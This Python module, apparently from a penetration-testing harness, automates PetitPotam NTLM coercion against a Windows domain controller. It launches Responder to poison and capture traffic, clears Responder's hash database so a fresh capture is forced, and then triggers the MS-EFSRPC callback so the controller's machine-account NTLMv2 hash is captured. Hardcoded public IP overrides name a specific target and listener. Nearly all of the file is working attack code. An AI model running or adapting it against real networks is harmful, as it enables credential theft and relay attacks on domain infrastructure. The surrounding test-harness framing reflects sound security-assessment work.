"""PetitPotam (MS-EFSRPC) NTLM coercion. Coerces the DC's machine account to
authenticate back to this Kali host over SMB, captured by Responder — the
same two-process chain as the manual test (Responder listening, PetitPotam
triggering the callback). Responder needs root (privileged port binds + raw
poisoning); this module self-elevates it via `sudo -n responder` when you're not
root — so run the harness as your normal user (NOT `sudo python3 gui.py`) and
give responder a NOPASSWD sudoers rule.

PetitPotam.py is vendored under modules/_vendor/ (source:
https://github.com/topotam/PetitPotam, PoC by @topotam77) so this module
has no runtime internet dependency.

For a target registered in modules/_portpatch.py:CUSTOM_PORT_TARGETS (real
SMB(445) not directly reachable, only a NAT-forwarded alternate is — see
test2.py for the full writeup), the *trigger* step below additionally runs
PetitPotam.py's CoerceAuth in-process instead of as a subprocess, since only
an in-process call can be patched (a subprocess doesn't inherit our socket
redirect); CoerceAuth always uses ncacn_np (an SMB named pipe, dest port
445), so unlike DRSUAPI there's no RPC endpoint-mapper/dynamic-port step to
worry about. For every other target, the trigger step is the exact same
`subprocess.run(["python3", PETITPOTAM, ...])` call as before. Either way,
this only fixes *reaching the target* to issue the coercion RPC call —
whether the DC can actually reach `listener_ip` back is a separate,
unrelated network question this module has no way to fix (see
modules/_vendor/PetitPotam.py / test2.py's PetitPotam notes); for the one
NAT'd target already registered below, LISTENER_IP_OVERRIDES supplies the
externally-reachable IP _local_ip()'s normal "what interface would I use to
route there" trick can't determine on its own.
"""
import io
import os
import sys
import shutil
import socket
import subprocess
import contextlib
import importlib.util
import time

from modules import _portpatch

IFACE = "eth0"
CAPTURE_WAIT = 6   # seconds to let the coerced auth land on Responder after triggering
VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor")
PETITPOTAM = os.path.join(VENDOR_DIR, "PetitPotam.py")
# Responder dedupes against creds already on file here and prints "Skipping
# previously captured hash" instead of the hash — deleting it before each
# run forces a fresh capture every time (Responder recreates it automatically
# if missing, only if not os.path.exists(...) — see utils.py:CreateResponderDb).
RESPONDER_DB = "/usr/share/responder/Responder.db"

META = {
    "id": "petitpotam",
    "name": "PetitPotam NTLM Coercion",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "control": "SMB signing / NTLM relay & outbound-auth protections",
    "fix": "Server",
    "mitre": ['T1187'],
    "cwe": ['CWE-294'],
    "tactic": 'Credential Access',
    "requires": ["responder", "python3"],
    "needs_root": True,            # Responder binds privileged ports + raw poisoning
    "os_supported": ["Linux"],     # Responder + eth0 raw poisoning are Linux-only
    "requires_files": [PETITPOTAM],  # vendored PoC under modules/_vendor/
    "ports": [("tcp", 445)],       # MS-EFSRPC coercion over SMB
    # a captured hash is the real finding; PetitPotam's own "Attack worked!"
    # only means the RPC coercion call landed, not that anything caught it.
    # "Skipping previously captured hash" also counts — Responder dedupes
    # against creds it already has on file, so a repeat run (e.g. the
    # harness's own 3-iteration mode) genuinely re-triggers the coercion but
    # won't reprint the hash; the DC still authenticated to us either way.
    # deliberately does NOT match RESPONDER-PRIV-ERROR — that means the
    # attack never ran at all (no root), which must NOT read as "blocked".
    "success_regex": r"NTLMv2-SSP Hash|Skipping previously captured hash",
    "blocked_regex": r"could not connect|timed out|Connection refused|RPC_S_ACCESS_DENIED",
}

# For NAT'd targets whose only route out is via a droplet's libvirt NAT
# gateway (confirmed on 159.223.35.108: DC's only route is
# 0.0.0.0/0 via 192.168.122.1, i.e. full outbound internet egress — no
# droplet-side forwarding needed for the callback), _local_ip()'s
# "what interface would I use to route toward target" trick returns our
# *private LAN* IP, which the DC has no route to at all. It needs our
# actual public IP instead — and reaching it also requires an inbound
# port-forward (445/tcp -> this host) on whatever NATs this laptop, which
# is outside this module's control; see the harness README / ask whoever
# manages that router.
LISTENER_IP_OVERRIDES = {
    "159.223.35.108": "180.75.232.161",
}


def _local_ip(target):
    if target in LISTENER_IP_OVERRIDES:
        return LISTENER_IP_OVERRIDES[target]
    # UDP connect() just sets the default peer (no packets, no handshake), so it
    # won't block — but set a timeout anyway and fall back rather than raise.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.settimeout(3)
        s.connect((target, 80))
        return s.getsockname()[0]
    except OSError:
        return "0.0.0.0"
    finally:
        s.close()


def _load_coerce_auth():
    spec = importlib.util.spec_from_file_location("_vendored_petitpotam", PETITPOTAM)
    mod = importlib.util.module_from_spec(spec)
    # impacket's NDR (de)marshalling looks classes up via sys.modules[cls.__module__]
    # (EfsRpcOpenFileRaw etc. get __module__ == this spec's name) — without
    # registering it here first, dce.request(...) fails with "No module
    # named '_vendored_petitpotam'" even though connect()/bind() succeeded.
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod.CoerceAuth


def _trigger_coercion_in_process(target, listener_ip, creds):
    """In-process equivalent of the subprocess call below (default pipe:
    lsarpc), used only for a registered NAT'd target — see module
    docstring for why a subprocess can't be patched."""
    _portpatch.install(target)
    buf = io.StringIO()
    try:
        CoerceAuth = _load_coerce_auth()
        coerce = CoerceAuth()
        with contextlib.redirect_stdout(buf):
            dce = coerce.connect(
                username=creds.get("dc_user", ""), password=creds.get("dc_pass", ""),
                domain=creds.get("domain", ""), lmhash="", nthash="",
                target=target, pipe="lsarpc", doKerberos=False, dcHost=None, targetIp=None,
            )
            if dce is not None:
                coerce.EfsRpcOpenFileRaw(dce, listener_ip)
                dce.disconnect()
        return buf.getvalue()
    except Exception as e:
        import traceback
        return buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        _portpatch.remove()


def run(target, ctx):
    out = [f"# PetitPotam coercion vs {target} -> callback to this host ({IFACE})"]

    if not os.path.exists(PETITPOTAM):
        return "[ERROR] PetitPotam.py not found under modules/_vendor/."
    if shutil.which("responder") is None:
        return "[ERROR] responder not installed (sudo apt install responder)."

    try:
        os.remove(RESPONDER_DB)
        out.append(f"(cleared {RESPONDER_DB} — forcing a fresh capture, not a dedup skip)")
    except FileNotFoundError:
        pass
    except PermissionError:
        out.append(f"[WARN] could not clear {RESPONDER_DB} (not root?) — a "
                    "previously-seen hash may still show as a dedup skip.")

    # PYTHONUNBUFFERED — without it, Responder (a Python tool) block-buffers
    # its stdout once it's not attached to a real TTY (i.e. always, when
    # piped from here), so output only appears once the internal buffer
    # fills or the process exits cleanly — terminate() can lose it entirely.
    resp_env = {**os.environ, "PYTHONUNBUFFERED": "1"}
    # elevate Responder via `sudo -n` (never prompts) when not already root, so a
    # NOPASSWD sudoers rule for responder works without running the whole harness
    # as root. `sudo -E` preserves PYTHONUNBUFFERED across the sudo boundary.
    import core
    pfx = core.sudo_prefix()
    resp_cmd = (pfx + ["-E", "responder", "-I", IFACE]) if pfx else ["responder", "-I", IFACE]
    responder = subprocess.Popen(
        resp_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        env=resp_env)

    time.sleep(2)  # let Responder finish binding its listeners before triggering
    if responder.poll() is not None:
        # exited already (almost always: not running as root)
        early_out, _ = responder.communicate()
        low = (early_out or "").lower()
        out.append("## Responder\n" + (early_out or ""))
        if any(m in low for m in ("a password is required", "a terminal is required", "sudo:")):
            out.append(
                "RESPONDER-PRIV-ERROR: `sudo -n responder` was refused — passwordless "
                "sudo isn't configured for responder. Add a NOPASSWD sudoers rule "
                "for responder, or run the harness as root. The target was never coerced.")
        elif "must be run as root" in low:
            out.append(
                "RESPONDER-PRIV-ERROR: Responder needs root (privileged port "
                "binds + raw poisoning). Add a NOPASSWD rule for responder, or "
                "run the harness as root — the target was never actually coerced.")
        else:
            out.append("RESPONDER-PRIV-ERROR: Responder exited before the trigger ran.")
        return "\n".join(out)

    listener_ip = _local_ip(target)
    creds = ctx.creds
    if _portpatch.is_custom_port_target(target):
        out.append("## PetitPotam\n" + _trigger_coercion_in_process(target, listener_ip, creds))
    else:
        try:
            pp = subprocess.run(
                ["python3", PETITPOTAM,
                 "-d", creds.get("domain", ""),
                 "-u", creds.get("dc_user", ""),
                 "-p", creds.get("dc_pass", ""),
                 listener_ip, target],
                capture_output=True, text=True, timeout=30)
            out.append("## PetitPotam\n" + pp.stdout + pp.stderr)
        except subprocess.TimeoutExpired:
            out.append("## PetitPotam\n[TIMEOUT] PetitPotam did not finish in time")

    time.sleep(CAPTURE_WAIT)  # let the coerced callback land on Responder

    responder.terminate()
    try:
        resp_out, _ = responder.communicate(timeout=5)
    except Exception:
        responder.kill()
        resp_out, _ = responder.communicate()

    out.append("## Responder\n" + (resp_out or "(no output)"))
    return "\n".join(out)
